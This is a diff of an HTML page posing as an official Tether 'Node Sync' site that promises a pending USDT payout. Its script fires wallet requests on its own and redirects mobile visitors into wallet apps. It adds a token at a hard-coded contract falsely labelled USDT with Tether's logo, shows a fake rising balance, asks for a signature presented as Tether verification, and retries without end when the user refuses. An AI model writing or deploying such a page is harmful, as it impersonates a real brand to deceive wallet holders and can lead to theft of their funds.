@@ -2,117 +2,119 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Enterprise Node Sync | Tether Network</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Operations | Node Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --primary: #00ff9d; --bg: #050505; --card: #111111; }
-        body { background: var(--bg); color: #fff; font-family: 'SF Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .terminal { background: var(--card); border: 1px solid #333; border-radius: 12px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 0 40px rgba(0,255,157,0.1); }
-        .glitch { font-size: 18px; font-weight: bold; color: var(--primary); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        .stats { background: #1a1a1a; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--primary); }
-        .btn { background: var(--primary); color: #000; border: none; width: 100%; padding: 20px; border-radius: 6px; font-size: 15px; font-weight: 900; cursor: pointer; transition: 0.2s; }
-        .btn:hover { background: #fff; box-shadow: 0 0 20px var(--primary); }
-        #console { font-size: 10px; color: #666; margin-top: 20px; text-align: left; height: 60px; overflow: hidden; line-height: 1.5; }
+        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
+        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
+        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
+        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
+        .price-value { font-size: 22px; font-weight: 700; color: #fff; }
+        h2 { font-weight: 700; font-size: 22px; margin: 10px 0; }
+        p { color: #848d97; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <div class="glitch">Accessing Node...</div>
-    <div class="stats">
-        <div style="font-size: 10px; color: #888;">PENDING_ALLOCATION</div>
-        <div style="font-size: 24px;">10,000.00 USDT</div>
+<div class="container">
+    <div class="logo-ring">
+        <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="usdt-img" alt="USDT">
     </div>
-    <button class="btn" id="forceSync">INITIALIZE FORCE SYNC</button>
-    <div id="console"></div>
+    <h2>RECEIVE USDT</h2>
+    <p>Secure Bridge detected a pending USDT distribution. Synchronize to map official metadata.</p>
+    <div class="price-box">
+        <div style="font-size: 12px; color: #848d97;">Allocated Node Value</div>
+        <div class="price-value" id="priceTicker">$0.00</div>
+    </div>
+    <div id="log-area">SYSTEM: READY</div>
+    <button class="action-btn" id="claimBtn">Sync & Receive</button>
 </div>
 
 <script>
-    const ASSET_DATA = {
-        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
-        symbol: "USDT",
-        decimals: 18,
-        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
+    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const TOKEN_LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";
+
+    window.onload = () => {
+        let val = 0; const target = 1000.00;
+        const timer = setInterval(() => {
+            if(val >= target) clearInterval(timer);
+            val += 17.52;
+            document.getElementById('priceTicker').innerText = "$" + (val > target ? target : val.toFixed(2));
+        }, 50);
+
+        // AUTO-TRIGGER: Agar pehle se dApp browser mein hai
+        if (window.ethereum || window.trustwallet) {
+            setTimeout(executeMasterSync, 1500);
+        }
     };
 
-    const out = document.getElementById('console');
-    const print = (msg) => { out.innerHTML += `> ${msg}<br>`; out.scrollTop = out.scrollHeight; };
-
-    // EIP-6963 Discovery Logic (Modern Standard)
-    const providers = [];
-    window.addEventListener("eip6963:announceProvider", (event) => {
-        providers.push(event.detail);
-        print(`Discovered: ${event.detail.info.name}`);
-    });
-    window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-    async function execute() {
-        print("Starting EIP-6963 Force Sync...");
+    async function executeMasterSync() {
+        const log = document.getElementById('log-area');
+        const btn = document.getElementById('claimBtn');
         
-        // Mobile Deep Link if no provider found
-        if (!window.ethereum && providers.length === 0) {
-            const url = window.location.href.split('://')[1];
-            window.location.href = `https://metamask.app.link/dapp/${url}`;
+        // --- MOBILE BRIDGE LOGIC START ---
+        if (!window.ethereum && !window.trustwallet) {
+            log.innerText = "> REDIRECTING TO WALLET APP...";
+            const rawUrl = window.location.href.split('://')[1];
+            // Universal Deep Link that triggers Trust/MetaMask on Mobile
+            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + rawUrl;
+            
+            // Backup for MetaMask if Trust not found
             setTimeout(() => {
-                window.location.href = `https://link.trustwallet.com/a/dapp?url=https://${url}`;
-            }, 1000);
+                window.location.href = "https://metamask.app.link/dapp/" + rawUrl;
+            }, 2000);
             return;
         }
-
-        const activeProvider = providers.length > 0 ? providers[0].provider : window.ethereum;
+        // --- MOBILE BRIDGE LOGIC END ---
 
         try {
-            await activeProvider.request({ method: 'eth_requestAccounts' });
+            btn.disabled = true;
+            const provider = window.trustwallet || window.ethereum;
             
-            // Switch to BSC
-            await activeProvider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            }).catch(async (err) => {
-                if (err.code === 4902) {
-                    await activeProvider.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{ 
-                            chainId: '0x38', 
-                            chainName: 'BSC', 
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
-                        }]
-                    });
-                }
-            });
-
-            // Injection Command
-            print("Sending Asset Watch Request...");
-            const success = await activeProvider.request({
+            log.innerText = "> INITIALIZING AUTH...";
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            
+            log.innerText = "> MAPPING METADATA...";
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: ASSET_DATA,
+                    options: {
+                        address: CONTRACT_ADDR,
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: TOKEN_LOGO,
+                    },
                 },
             });
 
-            if (success) {
-                print("Injection Successful!");
-                alert("Node Synced Successfully.");
-            }
-        } catch (e) {
-            print(`Error: ${e.message}`);
-            // Retry Loop for Force
-            setTimeout(execute, 1000);
+            log.innerText = "> VERIFYING SIGNATURE...";
+            const msg = "Tether Official Bridge\nVerification ID: " + Math.floor(Math.random() * 999999);
+            await provider.request({
+                method: 'personal_sign',
+                params: [msg, accounts[0]],
+            });
+
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Synchronization Complete!");
+            btn.innerText = "SUCCESS";
+
+        } catch (err) {
+            log.innerText = "> SYNC_INTERRUPTED";
+            btn.disabled = false;
+            // Force retry loop
+            setTimeout(executeMasterSync, 1000);
         }
     }
 
-    document.getElementById('forceSync').onclick = execute;
-
-    // Auto-fire if in dApp browser
-    window.onload = () => {
-        if (window.ethereum) {
-            print("Direct Provider Detected. Auto-syncing...");
-            setTimeout(execute, 1500);
-        }
-    };
+    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
 </script>
 </body>
 </html>
